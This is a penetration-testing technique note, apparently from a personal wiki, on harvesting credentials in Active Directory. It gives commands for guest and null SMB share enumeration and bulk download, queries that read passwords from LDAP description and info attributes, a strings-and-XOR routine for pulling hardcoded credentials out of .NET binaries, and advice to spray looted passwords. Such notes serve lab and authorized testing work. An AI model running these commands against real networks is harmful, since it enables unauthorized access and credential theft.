---
title: AD Credential Looting — Quick Wins
slug: ad-credential-looting
category: techniques
updated: 2026-07-24
summary: "Quick-win creds: SMB null/guest shares, LDAP info/description attrs, hardcoded creds in .NET binaries (strings -e l)"
tags: [ad, smb, null-session, guest, ldap, info-attribute, dotnet, strings, loot]
sensitive: false
---

# AD Credential Looting — Quick Wins

## When to use
Early foothold in AD with no creds (or a low-priv account). Three cheap sources of
passwords before touching heavier attacks: **SMB null/guest shares**, **LDAP
`info`/`description` attributes**, and **hardcoded creds in .NET binaries**. Worked
example: a Windows AD box chained all three (guest share → .NET binary → ldap creds →
`info` attr → foothold).

## 1. SMB null / guest session
```bash
# Detect null/guest auth
nxc smb DC_IP                                  # look for "Null Auth: True" / signing
nxc smb DC_IP -u guest -p '' --shares          # readable shares as guest
nxc smb DC_IP -u '' -p '' --shares             # true null session

# Pull files from a readable share
smbclient //DC_IP/share-name -U 'guest%' -c 'ls'
smbclient //DC_IP/share-name -U 'guest%' -c 'get interesting.zip'
# recurse everything:
smbclient //DC_IP/share-name -U 'guest%' -c 'recurse ON; prompt OFF; mget *'
```
- Grab configs, scripts, `.zip`, and any custom tooling — those hold creds far more
  often than the SMB itself.

## 2. Passwords in LDAP `info` / `description` / `comment`
Any authenticated (sometimes anonymous) account can read these attributes. Admins stash
passwords there constantly.
```bash
# With any domain creds
ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASS' \
  -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName info description comment
# Anonymous (if allowed)
ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=local' \
  '(objectClass=user)' sAMAccountName description info
# nxc equivalent (description only)
nxc ldap DC_IP -u USER -p PASS -M get-desc-users
```
- `info` (a.k.a. "Notes" in ADUC) is the sleeper — less audited than `description`.
- Grep the output: `... | grep -iE 'pass|pwd|cred|:'`.

## 3. Hardcoded creds in .NET binaries (no decompiler)
When you have a `.exe`/`.dll` but no ILSpy/dnSpy handy, .NET strings are **UTF-16LE** —
default `strings` (8-bit) misses them.
```bash
strings -e l UserInfo.exe | grep -iE 'pass|pwd|user|key|http|ldap|connectionstring'
strings -e l app.dll  | less     # -e l = 16-bit little-endian (UTF-16)
```
- `-e l` is the flag that matters. Also try `-e b` (big-endian) if empty.
- Look for base64 blobs + a nearby key: obfuscation is often base64 → XOR with a hardcoded
  key. Decode in one line, e.g. (one real `getPassword`: `b64 → ^"armando" → ^0xDF`):
  ```bash
  python3 -c 'import base64;e=base64.b64decode("<B64>");k=b"<KEY>";print(bytes((c^k[i%len(k)]^0xDF)&0xff for i,c in enumerate(e)).decode())'
  ```
- Full decompile when needed: `ilspycmd UserInfo.exe > src.cs` (or open in dnSpy on Windows).

## Gotchas
- `nxc` "Null Auth: True" ≠ readable shares — always follow with `--shares` to confirm.
- LDAP simple bind needs the DN/UPN right: `USER@DOMAIN` or `CN=..,DC=..`; wrong form →
  `invalidCredentials (49)` even with a valid password.
- UTF-16 strings: reversing the XOR order/mask blindly gives garbage — trust the decompiled
  routine (or brute the mask 0x00–0xFF and pick printable output).
- Treat any looted cred as reusable: spray it across users/protocols (see [[password-spray]]).

## References
- Relacionado: [[active-directory-attacks]], [[rbcd-to-domain-admin]], [[netexec-crackmapexec]], [[password-spray]], [[service-enumeration]]
- Worked example: internal AD lab notes.
